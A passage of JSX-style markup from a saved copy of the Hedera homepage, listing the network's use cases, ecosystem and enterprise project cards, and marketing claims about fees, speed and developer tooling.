            // dataSavepageHref="/use-cases/real-world-asset-tokenization"
            href="https://hedera.com/use-cases/real-world-asset-tokenization"
            className="Btn is-gradient-outline blue-green"
            target="_self"
          >Learn more</a>
        </div>

        <div className="box">
          <div className="box-body">
            <img
              src="https://files.hedera.com/Nav-Icon-Customer-Loyalty-std-v1.svg?dm=1710326416"
              width="54"
              height="54"
              
            />

            <h3 className="box-heading">
              CONSUMER ENGAGEMENT &amp; LOYALTY
            </h3>

            <div className="box-description">
              Whether you’re a globally-recognized brand or individual creator, Hedera makes it simple to issue NFT membership and reward tokens in real-time to cultivate a trustworthy ecosystem.
            </div>
          </div>

          <a
            // dataSavepageHref="/use-cases/consumer-engagement-loyalty"
            href="https://hedera.com/use-cases/consumer-engagement-loyalty"
            className="Btn is-gradient-outline blue-green"
            target="_self"
          >Learn more</a>
        </div>

        <div className="box">
          <div className="box-body">
            <img
              src="https://files.hedera.com/Use-Case-Sustainability-Icon-2.svg?dm=1709016539"
              width="54"
              height="54"
              
            />

            <h3 className="box-heading">SUSTAINABILITY</h3>

            <div className="box-description">
              Build, deploy, or access sustainability solutions that take full advantage of Hedera's low energy network, with world class governance.
            </div>
          </div>

          <a
            // dataSavepageHref="/use-cases/sustainability"
            href="https://hedera.com/use-cases/sustainability"
            className="Btn is-gradient-outline blue-green"
            target="_self"
          >Learn more</a>
        </div>

        <div className="box">
          <div className="box-body">
            <img
              src="https://files.hedera.com/Homepage-Icon-1.svg?dm=1709010266"
              width="54"
              height="54"
              
            />

            <h3 className="box-heading">DEFI</h3>

            <div className="box-description">
              Build new or port over existing decentralized exchanges, lending protocols, oracles, network bridges, and more using performance-optimized EVM smart contracts.
            </div>
          </div>

          <a
            // dataSavepageHref="/use-cases/defi"
            href="https://hedera.com/use-cases/defi"
            className="Btn is-gradient-outline blue-green"
            target="_self"
          >Learn more</a>
        </div>

        <div className="box">
          <div className="box-body">
            <img
              src="https://files.hedera.com/Homepage-Icon-4.svg?dm=1709010274"
              width="54"
              height="54"
              
            />

            <h3 className="box-heading">DECENTRALIZED IDENTITY</h3>

            <div className="box-description">
              Manage decentralized identity in a secure, standards-based, and privacy-respecting manner.
            </div>
          </div>

          <a
            // dataSavepageHref="/use-cases/identity"
            href="https://hedera.com/use-cases/identity"
            className="Btn is-gradient-outline blue-green"
            target="_self"
          >Learn more</a>
        </div>

        <div className="box">
          <div className="box-body">
            <img
              src="https://files.hedera.com/Homepage-Icon-6.svg?dm=1709010276"
              width="54"
              height="54"
              
            />

            <h3 className="box-heading">DECENTRALIZED LOGS</h3>

            <div className="box-description">
              Create low-cost, scalable, and publicly verifiable logs of data with native consensus timestamps — record payable events, supply chain provenance, IoT sensor data, and more.
            </div>
          </div>

          <a
            // dataSavepageHref="/use-cases/decentralized-logs"
            href="https://hedera.com/use-cases/decentralized-logs"
            className="Btn is-gradient-outline blue-green"
            target="_self"
          >Learn more</a>
        </div>

        <div className="box">
          <div className="box-body">
            <img
              src="https://files.hedera.com/Homepage-Icon-2.svg?dm=1709010268"
              width="54"
              height="54"
              
            />

            <h3 className="box-heading">NFTs</h3>

            <div className="box-description">
              Build the next big NFT marketplace or community — create collections and mint unique tokens representing digital media, physical assets, and more.
            </div>
          </div>

          <a
            // dataSavepageHref="/use-cases/nfts"
            href="https://hedera.com/use-cases/nfts"
            className="Btn is-gradient-outline blue-green"
            target="_self"
          >Learn more</a>
        </div>

        <div className="box">
          <div className="box-body">
            <img
              src="https://files.hedera.com/Homepage-Icon-5.svg?dm=1709010275"
              width="54"
              height="54"
              
            />

            <h3 className="box-heading">PAYMENTS</h3>

            <div className="box-description">
              Enable secure, real-time, and ultra-low-cost payments using HBAR, stablecoins, or your own cryptocurrency.
            </div>
          </div>

          <a
            // dataSavepageHref="/use-cases/payments"
            href="https://hedera.com/use-cases/payments"
            className="Btn is-gradient-outline blue-green"
            target="_self"
          >Learn more</a>
        </div>

        <div className="box">
          <div className="box-body">
            <img
              src="https://files.hedera.com/Homepage-Icon-3.svg?dm=1709010273"
              width="54"
              height="54"
              
            />

            <h3 className="box-heading">HEDERA ECOSYSTEM</h3>

            <div className="box-description">
              Applications, developer tools, network explorers, and more across the Hedera ecosystem, as well as information about each of Hedera's Governing Council Members.
            </div>
          </div>

          <a
            // dataSavepageHref="/ecosystem"
            href="https://hedera.com/ecosystem"
            className="Btn is-gradient-outline blue-green"
            target="_self"
          >EXPLORE NOW</a>
        </div>
      </div>
    </div>
  </div>

  <div className="Section" style={{width: '100vw', backgroundColor:'#fffffff0'}}>
    <div className="home-explore-ecosystem">
      <div className="explore-ecosystem-container">
        <div className="explore-ecosystem-container-gradients">
          <div>
            <img
              src="https://hedera.com/assets/images/home/middle-gradient-2.webp"
            />
          </div>
        </div>

        <img
          className="explore-ecosystem-container-circles"
          src="https://hedera.com/assets/images/home/circle-pattern.svg"
        />

        <div className="explore-ecosystem-container-grid">
          <div className="text">
            <div className="text-group">
              <h2 className="heading">
                What is&nbsp;

                <strong>Hedera</strong>

                ?
              </h2>

              <div className="description" style={{fontFamily: 'system-ui', fontWeight: 'lighter'}}>
                <p>
                  Hedera is a decentralized, open-source, proof-of-stake public ledger that utilizes the leaderless, asynchronous Byzantine Fault Tolerance (aBFT) hashgraph consensus algorithm. It is governed by a collusion-resistant, decentralized council of leading enterprises, universities, and web3 projects from around the world.
                </p>

                <p>
                  Hedera’s performance-optimized Ethereum Virtual Machine (EVM) smart contracts, along with its easy-to-use native tokenization and consensus service APIs, enable developers to create real-time web3 applications and ecosystems that will drive the future of the internet.
                </p>

                <p>
                  Hedera is built differently from other blockchains. It has high throughput with fast finality; low, predictable fees; fair transaction ordering with consensus timestamps; and a robust codebase that ensures scalability and reliability at every layer of its network infrastructure. Hedera is governed responsibly by the world’s leading organizations to ensure that the network is collusion-resistant.
                </p>
              </div>
            </div>

            <div className="actions">
              <a
                href="https://hedera.com/get-started"
                className="Btn is-gradient-green"
                target="_blank"
                rel="noreferrer noopener"
              >START BUILDING</a>

              <a
                href="https://hedera.com/how-it-works"
                className="Btn is-white has-bg"
                target="_blank"
                rel="noreferrer noopener"
              >HOW IT WORKS</a>
            </div>
          </div>

          <div className="explore-ecosystem-container-icon">
            <div>
              <img
                src="https://hedera.com/assets/images/home/h-icon.svg"
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div className="Section" style={{width: '100vw', backgroundColor:'#fffffff0'}}>

    <div className="home-hello-future">
      <div
        className="clip-text"
        style={{backgroundImage: 'var(--savepage-url-177)', backgroundPosition: '-1709px 50%', fontSize: '17.25vw', textAlign: 'center',marginLeft: '-1.5vw', marginBottom: '-3vw',letterSpacing: '-1.25vw'}}
      >hellofuture</div>
    </div>
  </div>

  <div className="Section" style={{width: '100vw', backgroundColor:'#fffffff0'}}>

    <div className="home-case-studies">
      <div className="heading-row">
        <h2 className="heading">
          Applications powered by Hedera
        </h2>

        <div className="description">
          From innovative web3 ecosystems to Fortune 500 companies, developers are building the next generation of the web on Hedera
        </div>
      </div>

      <div className="sections">
        <div className="section section-one">
          <div className="text-wrapper">
            <div className="text">
              <h3 className="heading">WEB3 ECOSYSTEM APPLICATIONS</h3>

              <div className="description">
                Web3 projects are building next-generation applications on Hedera across DeFi, NFT, creator economy, sustainability, and more.
              </div>

              <a
                // dataSavepageHref="/ecosystem/web3"
                href="https://hedera.com/ecosystem/web3"
                className="Btn is-gradient-green"
                target="_blank"
                rel="noreferrer noopener"
              >View all</a>
            </div>
          </div>

          <div className="ecosystem-carousel sectionOne-wrapper">
            <div className="slider-controls">
              <button
                className="prev swiper-button-disabled"
                type="button"
                data-controls="prev"
              ></button>

              <button
                className="next show-text"
                type="button"
                data-controls="next"
              ></button>
            </div>

            <div className="fade-wrapper-next">
              <div className="fade-wrapper-prev disabled">
                <div
                  id="sectionOne"
                  className="my-slider swiper swiper-container-initialized swiper-container-horizontal swiper-container-pointer-events swiper-container-free-mode"
                >
                  <div
                    className="swiper-wrapper"
                    style={{transform: 'translate3d(0px, 0px, 0px)'}}
                  >
                    <div
                      className="ecosystem-card swiper-slide item-theme- swiper-slide-active"
                      style={{marginRight: '40px'}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <a
                            href="https://www.saucerswap.finance/"
                            target="_blank"
                            rel="noreferrer noopener"
                          >
                            <div className="logo">
                              <img
                                className="swiper-lazy"
                                src="https://files.hedera.com/SS-v2-Logotype_SS-Logotype-V2-Blk-Grn.svg?dm=1710341912"
                              />
                            </div>
                          </a>

                          <div className="divider"></div>

                          <div className="title">SaucerSwap</div>

                          <div className="contentSub">
                            DEX offering a full suite of DeFi services.
                          </div>

                          <div className="subtitle">$SAUCE</div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                className="link link-website"
                                href="https://www.saucerswap.finance/"
                                target="_blank"
                                rel="noreferrer noopener"
                                // style={{backgroundImage: 'url("/assets/icons/brower.png")'}}
                              ></a>

                              <a
                                className="link link-discord"
                                href="https://discord.com/invite/saucerswap"
                                target="_blank"
                                rel="noreferrer noopener"
                                // style={{backgroundImage: 'url("/assets/icons/discord.png")'}}
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://twitter.com/SaucerSwapLabs"
                                target="_blank"
                                rel="noreferrer noopener"
                                // style={{backgroundImage: 'url("/assets/icons/x.png")'}}
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      className="ecosystem-card swiper-slide item-theme- swiper-slide-next"
                      style={{marginRight: '40px'}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <a
                            href="https://sentx.io/"
                            target="_blank"
                            rel="noreferrer noopener"
                          >
                            <div className="logo">
                              <img
                                className="swiper-lazy"
                                src="https://images.hedera.com/F8qHKYUW4AA_OWk-removebg-preview.png?w=621&auto=compress%2Cformat&fit=crop&dm=1709005473&s=134f2ba636e7242ef64b8651d874e106"
                              />
                            </div>
                          </a>

                          <div className="divider"></div>

                          <div className="title">SentX</div>

                          <div className="contentSub">
                            NFT launchpad, marketplace, &amp; explorer.
                          </div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                className="link link-website"
                                href="https://sentx.io/"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-discord"
                                href="https://discord.com/invite/bYjDBhB24F"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://twitter.com/SentX_io"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      className="ecosystem-card swiper-slide item-theme-"
                      style={{marginRight: "40px"}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <a
                            href="https://www.hashport.network/"
                            target="_blank"
                            rel="noreferrer noopener"
                          >
                            <div className="logo">
                              <img
                                className="swiper-lazy"
                                src="https://images.hedera.com/eco_hashport_color.png?w=227&auto=compress%2Cformat&fit=crop&dm=1709017992&s=e5d03ff9d4db26260197f7893b2c8359"
                              />
                            </div>
                          </a>

                          <div className="divider"></div>

                          <div className="title">hashport</div>

                          <div className="contentSub">
                            Interoperability of digital assets between networks.
                          </div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                className="link link-website"
                                href="https://www.hashport.network/"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-telgram"
                                href="https://t.me/hashport"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://twitter.com/hashportnetwork"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      className="ecosystem-card swiper-slide item-theme-"
                      style={{marginRight: '40px'}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <a
                            href="https://www.heliswap.io/"
                            target="_blank"
                            rel="noreferrer noopener"
                          >
                            <div className="logo">
                              <img
                                className="swiper-lazy"
                                src="https://images.hedera.com/web3_heliswap_color.png?w=227&auto=compress%2Cformat&fit=crop&dm=1709022503&s=58dd6f903308d3c77e19fe247224a31c"
                              />
                            </div>
                          </a>

                          <div className="divider"></div>

                          <div className="title">Heliswap</div>

                          <div className="contentSub">Decentralized exchange.</div>

                          <div className="subtitle">$HELI</div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                className="link link-website"
                                href="https://www.heliswap.io/"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-discord"
                                href="https://discord.gg/wVrkMwBKsm"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-telgram"
                                href="https://t.me/heliswap"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://twitter.com/heliswap_dex"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      className="ecosystem-card swiper-slide item-theme-"
                      style={{marginRight: '40px'}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <a
                            href="https://hedera.staderlabs.com/"
                            target="_blank"
                            rel="noreferrer noopener"
                          >
                            <div className="logo">
                              <img
                                className="swiper-lazy"
                                src="https://images.hedera.com/web3_staderlabs_color.png?w=151&amp;h=80&amp;auto=compress%2Cformat&amp;fit=crop&amp;dm=1709022529&amp;s=ef04cd66b3489cd08153d844c7ad5217"
                              />
                            </div>
                          </a>

                          <div className="divider"></div>

                          <div className="title">Stader Labs</div>

                          <div className="contentSub">Liquid staking protocol.</div>

                          <div className="subtitle">$HBARX</div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                className="link link-website"
                                href="https://hedera.staderlabs.com/"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-telgram"
                                href="https://t.me/StaderLabs_Hedera_Official"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://twitter.com/stader_hbar"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      className="ecosystem-card swiper-slide item-theme-"
                      style={{marginRight: '40px'}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <a
                            href="https://hashgraph.name/"
                            target="_blank"
                            rel="noreferrer noopener"
                          >
                            <div className="logo">
                              <img
                                className="swiper-lazy"
                                src="https://images.hedera.com/web3_hashgraphname_color.png?w=151&amp;h=80&amp;auto=compress%2Cformat&amp;fit=crop&amp;dm=1709022491&amp;s=ca9ca6bad0abcef543391268f9df9c07"
                              />
                            </div>
                          </a>

                          <div className="divider"></div>

                          <div className="title">hashgraph.name</div>

                          <div className="contentSub">
                            .hbar &amp; other domain names.
                          </div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                className="link link-website"
                                href="https://hashgraph.name/"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-discord"
                                href="https://discord.com/invite/FcN4CnnvWB"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://mobile.twitter.com/hashgraph_name"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

          </div>

          <div style={{clear:'both'}}></div>
        </div>

        <div className="section section-two">
          <div className="text-wrapper">
            <div className="text">
              <h3 className="heading">ENTERPRISE APPLICATIONS</h3>

              <div className="description">
                Enterprises are using Hedera to improve business processes and procedures across CBDC, Supply Chain, Finance, Fraud Mitigation, and more.
              </div>

              <a
                // dataSavepageHref="/ecosystem/enterprise"
                href="https://hedera.com/ecosystem/enterprise"
                className="Btn is-gradient-green"
                target="_blank"
                rel="noreferrer noopener"
              >View all</a>
            </div>
          </div>

          <div className="ecosystem-carousel sectionTwo-wrapper">
            <div className="slider-controls">
              <button
                className="prev swiper-button-disabled"
                type="button"
                data-controls="prev"
              ></button>

              <button
                className="next show-text"
                type="button"
                data-controls="next"
              ></button>
            </div>

            <div className="fade-wrapper-next">
              <div className="fade-wrapper-prev disabled">
                <div
                  id="sectionTwo"
                  className="my-slider swiper swiper-container-initialized swiper-container-horizontal swiper-container-pointer-events swiper-container-free-mode"
                >
                  <div
                    className="swiper-wrapper"
                    style={{transform: 'translate3d(0px, 0px, 0px)'}}
                  >
                    <div
                      className="ecosystem-card swiper-slide item-theme- swiper-slide-active"
                      style={{marginRight: '40px'}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <a
                            href="https://www.lgartlab.com/"
                            target="_blank"
                            rel="noreferrer noopener"
                          >
                            <div className="logo">
                              <img
                                className="swiper-lazy"
                                src="https://images.hedera.com/eco_lg_color.png?w=227&auto=compress%2Cformat&fit=crop&dm=1709017994&s=d2605738b951be23a7a408f7b496b2f3"
                              />
                            </div>
                          </a>

                          <div className="divider"></div>

                          <div className="title">LG</div>

                          <div className="contentSub">
                            Sustainable NFT marketplace to buy and sell digital artwork.
                          </div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                href="https://youtu.be/MaJzwurbDXI"
                                className="Btn is-black has-bg"
                                target="_blank"
                                rel="noreferrer noopener"
                              >WATCH VIDEO</a>
                            </div>

                            <div className="links">
                              <a
                                className="link link-case-study"
                                href="https://hedera.com/users/lg"
                              ></a>

                              <a
                                className="link link-website"
                                href="https://www.lgartlab.com/"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-discord"
                                href="https://discord.com/invite/lg-art-lab"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://twitter.com/lgartlab"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      className="ecosystem-card swiper-slide item-theme- swiper-slide-next"
                      style={{marginRight: '40px'}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <div className="logo">
                            <img
                              className="swiper-lazy"
                              src="https://images.hedera.com/eco_servicenow_color.png?w=227&auto=compress%2Cformat&fit=crop&dm=1709018007&s=18703e3bc0c0bbde49441db5e30f714c"
                            />
                          </div>

                          <div className="divider"></div>

                          <div className="title">ServiceNow</div>

                          <div className="contentSub">
                            Delivering multi-party workflow productivity.
                          </div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                href="https://hedera.com/users/servicenow"
                                className="Btn is-black has-bg"
                                target="_blank"
                                rel="noreferrer noopener"
                              >Case study</a>
                            </div>

                            <div className="links">
                              <a
                                className="link link-case-study"
                                href="https://hedera.com/blog/token-workflows-for-customer-engagement-loyalty"
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://twitter.com/servicenow"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      className="ecosystem-card swiper-slide item-theme-"
                      style={{marginRight: '40px'}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <a
                            href="https://www.atma.io/"
                            target="_blank"
                            rel="noreferrer noopener"
                          >
                            <div className="logo">
                              <img
                                className="swiper-lazy"
                                src="https://images.hedera.com/council_averyd_color.png?w=227&auto=compress%2Cformat&fit=crop&dm=1709017601&s=fd52934f65ad01a9c351e8d99b0432b8"
                              />
                            </div>
                          </a>

                          <div className="divider"></div>

                          <div className="title">Atma.io by Avery Dennison</div>

                          <div className="contentSub">
                            Connected product cloud by Avery Dennison.
                          </div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                href="https://hedera.com/users/atma-io"
                                className="Btn is-black has-bg"
                                target="_blank"
                                rel="noreferrer noopener"
                              >Case study</a>
                            </div>

                            <div className="links">
                              <a
                                className="link link-website"
                                href="https://www.atma.io/"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://twitter.com/AveryDennison"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      className="ecosystem-card swiper-slide item-theme-"
                      style={{marginRight: '40px'}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <a
                            href="https://www.eqtylab.io/"
                            target="_blank"
                            rel="noreferrer noopener"
                          >
                            <div className="logo">
                              <img
                                className="swiper-lazy"
                                src="https://images.hedera.com/eqtylab-logo-black.png?w=1500&auto=compress%2Cformat&fit=crop&dm=1709018122&s=4ef5a670e46ea8b1bb4881de231ef442"
                              />
                            </div>
                          </a>

                          <div className="divider"></div>

                          <div className="title">EQTY Lab</div>

                          <div className="contentSub">
                            Creating tools for responsible artificial intelligence.
                          </div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                href="https://hedera.com/users/eqty-lab"
                                className="Btn is-black has-bg"
                                target="_blank"
                                rel="noreferrer noopener"
                              >Case study</a>
                            </div>

                            <div className="links">
                              <a
                                className="link link-website"
                                href="https://www.eqtylab.io/"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://twitter.com/EQTYLab"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      className="ecosystem-card swiper-slide item-theme-"
                      style={{marginRight: '40px'}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <a
                            href="https://www.thecouponbureau.org/"
                            target="_blank"
                            rel="noreferrer noopener"
                          >
                            <div className="logo">
                              <img
                                className="swiper-lazy"
                                src="https://images.hedera.com/eco_coupon_color.png?w=151&amp;h=80&amp;auto=compress%2Cformat&amp;fit=crop&amp;dm=1709017977&amp;s=bf32adec53874602a1a39dad264bde38"
                              />
                            </div>
                          </a>

                          <div className="divider"></div>

                          <div className="title">The Coupon Bureau</div>

                          <div className="contentSub">
                            Maintains universal manufacturer offer promotions.
                          </div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                href="https://hedera.com/users/coupon-bureau"
                                className="Btn is-black has-bg"
                                target="_blank"
                                rel="noreferrer noopener"
                              >Case study</a>
                            </div>

                            <div className="links">
                              <a
                                className="link link-website"
                                href="https://www.thecouponbureau.org/"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://twitter.com/thecouponbureau"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      className="ecosystem-card swiper-slide item-theme-"
                      style={{marginRight: '40px'}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <a
                            href="https://www.meeco.me/"
                            target="_blank"
                            rel="noreferrer noopener"
                          >
                            <div className="logo">
                              <img
                                className="swiper-lazy"
                                src="https://images.hedera.com/eco_meeco_color.png?w=151&amp;h=80&amp;auto=compress%2Cformat&amp;fit=crop&amp;dm=1709018004&amp;s=cf58d59f90d1c50dc05024e2e22ea256"
                              />
                            </div>
                          </a>

                          <div className="divider"></div>

                          <div className="title">Meeco</div>

                          <div className="contentSub">
                            Access, control, and create value from personal data.
                          </div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                href="https://hedera.com/users/meeco"
                                className="Btn is-black has-bg"
                                target="_blank"
                                rel="noreferrer noopener"
                              >Case study</a>
                            </div>

                            <div className="links">
                              <a
                                className="link link-website"
                                href="https://www.meeco.me/"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://twitter.com/meeco_me"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      className="ecosystem-card swiper-slide item-theme-"
                      style={{marginRight: '40px'}}
                    >
                      <div className="card-container">
                        <div className="content">
                          <a
                            href="https://emtech.com/"
                            target="_blank"
                            rel="noreferrer noopener"
                          >
                            <div className="logo">
                              <img
                                className="swiper-lazy"
                                src="https://images.hedera.com/enterprise_emtech_color.png?w=151&amp;h=80&amp;auto=compress%2Cformat&amp;fit=crop&amp;dm=1709018078&amp;s=cbc279aff289c56606b711ea24dedbd6"
                              />
                            </div>
                          </a>

                          <div className="divider"></div>

                          <div className="title">Emtech</div>

                          <div className="contentSub">
                            Sustainable CBDC framework for central banks.
                          </div>

                          <div className="divider"></div>

                          <div className="lowerCard">
                            <div className="links">
                              <a
                                href="https://hedera.com/users/emtech"
                                className="Btn is-black has-bg"
                                target="_blank"
                                rel="noreferrer noopener"
                              >Case study</a>
                            </div>

                            <div className="links">
                              <a
                                className="link link-case-study"
                                href="https://hedera.com/blog/emtech-and-hedera-hashgraph-join-forces-for-highly-performant-trusted-and-energy-efficient-central-bank-blockchain-infrastructure"
                              ></a>

                              <a
                                className="link link-website"
                                href="https://emtech.com/"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>

                              <a
                                className="link link-twitter"
                                href="https://twitter.com/emtech_inc"
                                target="_blank"
                                rel="noreferrer noopener"
                              ></a>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

          </div>

          <div style={{clear:'both'}}></div>
        </div>
      </div>
    </div>
  </div>

  <div className="Section" style={{width: '100vw', backgroundColor:'#fffffff0'}}>
    <div className="home-hedera-features">
      <img
        className="bgImage bgImageHasMobile"
        src="https://images.hedera.com/HH-Homepage-Desktop-CarbonVP-BG.jpg?w=1680&auto=compress%2Cformat&fit=crop&dm=1709007457&s=79a4eee22b6c27b40da229a251e69601"
      />

      <img
        className="bgImage bgImageMobile"
        src="https://images.hedera.com/HH-Homepage-Mobile-CarbonVP-BG.jpg?w=390&h=1588&auto=compress%2Cformat&fit=crop&dm=1709007495&s=2e77c96429af63224e584752df4436fa"
      />

      <div className="row">
        <div className="column column-one">
          <div className="text">
            <h2 className="heading">
              Build the next big thing on Hedera
            </h2>

            <div className="description">
              <p>
                Developers on Hedera are first-class citizens, enabled by intuitive APIs and EVM smart contracts. Whether you're building a weekend project or the next big thing in web3, Hedera's native network service SDKs, EVM equivalence, and tooling makes innovation and development a breeze. Hedera's robust codebase ensures massively scalable and reliable network infrastructure, making it the perfect platform for developers to deploy ecosystem-critical web3 applications and protocols.
              </p>
            </div>

            <div className="actions">
              <a
                // dataSavepageHref="/get-started"
                href="https://hedera.com/get-started"
                className="Btn is-gradient-green"
                target="_blank"
                rel="noreferrer noopener"
              >START BUILDING</a>

              <a
                href="https://docs.hedera.com/hedera/"
                className="Btn is-white has-bg"
                target="_blank"
                rel="noreferrer noopener"
              >DOCUMENTATION</a>
            </div>
          </div>
        </div>

        <div className="column column-two">
          <div className="features">
            <div className="feature">
              <img
                src="https://files.hedera.com/HH-Home-Icon-Icon-3.svg?dm=1709007439"
                width="54"
                height="54"
                
              />

              <h3 className="feature-heading">
                Low-Cost, Immediate Settlement
              </h3>

              <div className="feature-description">
                Transactions on Hedera cost an average of $0.001 and settle with finality in 3-5 seconds — no more waiting for block confirmations.
              </div>
            </div>

            <div className="feature">
              <img
                src="https://files.hedera.com/HH-Home-Icon-Icon-4-v8.svg?dm=1710344193"
                width="39"
                height="54"
                
              />

              <h3 className="feature-heading">Massively Scalable</h3>

              <div className="feature-description">
                Hedera’s native services reliably scale to 10,000 TPS and beyond, powering the most demanding, mission-critical web3 applications and protocols.
              </div>
            </div>

            <div className="feature">
              <img
                src="https://files.hedera.com/HH-Home-Icon-Icon-2.svg?dm=1709007438"
                width="52"
                height="54"
                
              />

              <h3 className="feature-heading">Fairest Access &amp; Ordering</h3>

              <div className="feature-description">
                Hedera is a leaderless proof-of-stake network with aBFT hashgraph consensus. Transactions contain a consensus timestamp and are fairly ordered.
              </div>
            </div>

            <div className="feature">
              <img
                src="https://files.hedera.com/HH-Home-Icon-Icon-1.svg?dm=1709007437"
                width="51"
                height="54"
                
              />

              <h3 className="feature-heading">EVM Tooling &amp; Libraries</h3>

              <div className="feature-description">
                The EVM on Hedera is optimized for speed and scalability. Deploy smart contracts with ease using your favorite web3 environments, libraries, and tooling.
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div className="Section" style={{width: '100vw', backgroundColor:'#fffffff0'}}>
    <div className="home-cta-banner">
      <div className="heading-row">
        <h2 className="heading">Get Started with Hedera</h2>

        <div className="description">
          Whether you’re a developer, HBAR enthusiast, or web3 application user, here’s how to get started with Hedera.
        </div>
      </div>

      <div className="boxes">
        <div className="box">
          <img
            className="bgImage bgImageHasMobile"
            src="https://images.hedera.com/HH-Homepage-Desktop-CTA-1.jpg?w=974&h=612&auto=compress%2Cformat&fit=crop&dm=1709007454&s=545cec5067506959fa25db3400449a1e"
          />

          <img
            className="bgImage bgImageMobile"
            src="https://images.hedera.com/HH-Homepage-Mobile-CTA-1.jpg?w=375&h=382&auto=compress%2Cformat&fit=crop&dm=1709007483&s=f1f71843c9b693d7b48f9d6fe91e8627"
          />

          <div className="box-body">
            <div className="box-text">
              <h3 className="box-heading">DEVELOPERS</h3>

              <div className="box-description">
                Learn how to start building on Hedera, join the developer community, and contribute to the codebase.
              </div>
            </div>

            <a
              href="https://docs.hedera.com/hedera/getting-started/introduction"
              className="Btn is-white has-bg"
              target="_blank"
              rel="noreferrer noopener"
            >Start building</a>
          </div>
        </div>

        <div className="box">
          <img
            className="bgImage bgImageHasMobile"
